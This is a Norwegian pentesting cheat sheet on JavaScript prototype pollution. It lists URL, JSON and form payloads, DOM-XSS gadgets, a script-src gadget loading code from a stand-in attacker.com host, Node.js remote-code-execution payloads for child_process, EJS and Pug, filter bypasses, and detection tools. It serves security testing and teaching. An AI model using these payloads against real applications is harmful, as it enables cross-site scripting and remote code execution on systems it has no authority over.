# 🧬 Hurtigreferanse for prototype pollution

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██████╗ ██████╗  ██████╗ ████████╗ ██████╗ ████████╗██╗   ██╗██████╗ ███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔═══██╗╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔════╝
  ██████╔╝██████╔╝██║   ██║   ██║   ██║   ██║   ██║    ╚████╔╝ ██████╔╝█████╗  
  ██╔═══╝ ██╔══██╗██║   ██║   ██║   ██║   ██║   ██║     ╚██╔╝  ██╔═══╝ ██╔══╝  
  ██║     ██║  ██║╚██████╔╝   ██║   ╚██████╔╝   ██║      ██║   ██║     ███████╗
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝    ╚═╝      ╚═╝   ╚═╝     ╚══════╝
                 ██████╗  ██████╗ ██╗     ██╗     ██╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗
                 ██╔══██╗██╔═══██╗██║     ██║     ██║   ██║╚══██╔══╝██║██╔═══██╗████╗  ██║
                 ██████╔╝██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██╔██╗ ██║
                 ██╔═══╝ ██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██║╚██╗██║
                 ██║     ╚██████╔╝███████╗███████╗╚██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║
                 ╚═╝      ╚═════╝ ╚══════╝╚══════╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

> **Begreper og presisering:** Prototype pollution endrer arvede egenskaper; en gadget er kode som senere bruker dem på en farlig måte, og en sink er stedet der virkningen oppstår. Ikke alle objekter arver fra Object.prototype, og egne egenskaper kan skjule arvede verdier. Å skrive direkte til Object.prototype i konsollen viser JavaScript-atferd, ikke at applikasjonen har en angriperstyrt kilde. JSON eller en URL alene forurenser ikke automatisk prototypen. RCE-/DOM-eksemplene krever bestemte parser-, merge-, gadget- og versjonsforutsetninger. Se [MDNs forklaring](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution). Alle kode- og payloadverdier er bevart.


## 🎯 Hva er prototype pollution?

**Prototype pollution** er en JavaScript-sårbarhet der en angriper kan endre en prototype, for eksempel `Object.prototype`, og dermed påvirke objekter som arver fra den.

### Konsekvenser
- 🔴 **XSS** – endring av DOM
- 🔴 **RCE** – på serversiden (Node.js)
- 🔴 **Omgåelse** – sikkerhetskontroller
- 🔴 **Tjenestenekt** – applikasjonskrasj

---

## 🔍 JavaScript-prototyper

### Slik fungerer det
```javascript
// Alle objekter arver fra Object.prototype ifølge originalen
let obj = {};
obj.__proto__ === Object.prototype  // true

// Hvis vi endrer prototypen:
Object.prototype.polluted = "hacked";

// Alle aktuelle objekter påvirkes:
let newObj = {};
console.log(newObj.polluted);  // "hacked"
```

### Risikofylte egenskaper
```javascript
__proto__
constructor
prototype
```

---

## 💉 Payloads på klientsiden

### Via URL (spørrestreng/fragment)
```
# Grunnleggende
?__proto__[polluted]=value
?__proto__.polluted=value

# Konstruktør
?constructor[prototype][polluted]=value

# Nestet
?__proto__[__proto__][polluted]=value

# URL-kodet
?__proto__%5Bpolluted%5D=value
```

### Via JSON
```javascript
// Brukerinndata
{"__proto__": {"polluted": "value"}}
{"constructor": {"prototype": {"polluted": "value"}}}

// Nestet
{"a": {"__proto__": {"polluted": "value"}}}
```

### Via skjemadata
```html
<input name="__proto__[polluted]" value="hacked">
<input name="constructor[prototype][polluted]" value="hacked">
```

---

## 🔥 Eksempler på utnyttelse

### DOM-XSS via innerHTML
```javascript
// Hvis koden gjør dette:
element.innerHTML = obj.html || "";

// Endre prototypen:
?__proto__[html]=<img src=x onerror=alert(1)>

// Resultat: XSS!
```

### Gadget for script src
```javascript
// Hvis koden gjør dette:
let script = document.createElement('script');
script.src = obj.src || '/default.js';

// Endre prototypen:
?__proto__[src]=data:,alert(1)//
?__proto__[src]=//attacker.com/evil.js
```

### Kombinasjon med DOM clobbering
```javascript
// Vanlige gadget-mønstre
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[outerHTML]=<img src=x onerror=alert(1)>
?__proto__[srcdoc]=<script>alert(1)</script>
```

### jQuery-gadgets
```javascript
// jQuery < 3.4.0
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))

// Utnyttelse
?__proto__[url]=javascript:alert(1)
```

---

## 🖥️ På serversiden (Node.js)

### RCE via child_process
```javascript
// Hvis appen bruker spawn/exec med et options-objekt:
const { spawn } = require('child_process');
spawn('ls', [], options);

// Endre prototypen:
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(1)"}}

// Eller:
{"__proto__": {"shell": true, "env": {"NODE_OPTIONS": "--require /tmp/pwn.js"}}}
```

### RCE via require()
```javascript
// Payload for prototype pollution
{"__proto__": {"main": "./pwned.js"}}
```

### RCE i EJS-maler
```javascript
// EJS (< 3.1.7) RCE
{"__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"
}}
```

### RCE i Pug-maler
```javascript
// Pug RCE
{"__proto__": {
    "block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync('id')"
    }
}}
```

---

## 🔍 Identifikasjon

### Manuell testing
```javascript
// I nettleserkonsollen:
Object.prototype.testPollution = "polluted";
let obj = {};
console.log(obj.testPollution);  // Hvis "polluted" vises, tolker originalen det som sårbart; se presiseringen

// Rydd opp
delete Object.prototype.testPollution;
```

### Testing via URL
```
# Legg til i URL-en og undersøk konsollen
?__proto__[test]=polluted

// I konsollen:
({}).test  // Bør være undefined; "polluted" kan tyde på en kilde, se presiseringen
```

### Finn gadgets (DOM Invader)
```
1. Installer DOM Invader (Burp Suite)
2. Aktiver modusen for prototype pollution
3. Utforsk applikasjonen
4. Se etter sinks som kan utnyttes
```

---

## 🛠️ Verktøy

| Verktøy | Formål |
|------|---------|
| **DOM Invader** | Burp-verktøy for identifikasjon av prototype pollution |
| **ppfuzz** | Fuzzer for prototype pollution |
| **ppmap** | Søk etter gadgets |
| **PPScan** | Skanner for klientsiden |

### Bruk av ppmap
```bash
# Installer
git clone https://github.com/nickvdyck/ppmap
cd ppmap

# Undersøk
node ppmap.js https://target.com
```

---

## 📊 Hurtigreferanse

### Payloadformater
| Format | Payload |
|--------|---------|
| Spørrestreng | `?__proto__[x]=y` |
| Fragment | `#__proto__[x]=y` |
| JSON | `{"__proto__":{"x":"y"}}` |
| Sammenslåing | `Object.assign({},input)` |

### Vanlige gadgets
| Egenskap | Konsekvenser |
|----------|--------|
| `innerHTML` | XSS |
| `src` | Skriptinjeksjon |
| `href` | Omdirigering |
| `shell` | RCE (Node.js) |
| `env` | RCE (Node.js) |

### Omgåelsesteknikker
```javascript
// Hvis __proto__ filtreres:
constructor.prototype.polluted = "value"

// Annen skrivemåte
["__proto__"]["polluted"] = "value"

// Unicode
{"\u005f\u005fproto\u005f\u005f": {"x": "y"}}
```

---

## 📚 Ressurser

- [PortSwigger Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [Server-side Prototype Pollution](https://portswigger.net/research/server-side-prototype-pollution)
- [Client-side PP Scanner](https://github.com/nickvdyck/ppmap)

---

<p align="center">
  <b>🧬 Undersøk prototype pollution!</b><br>
  <i>Bare til autorisert testing!</i>
</p>
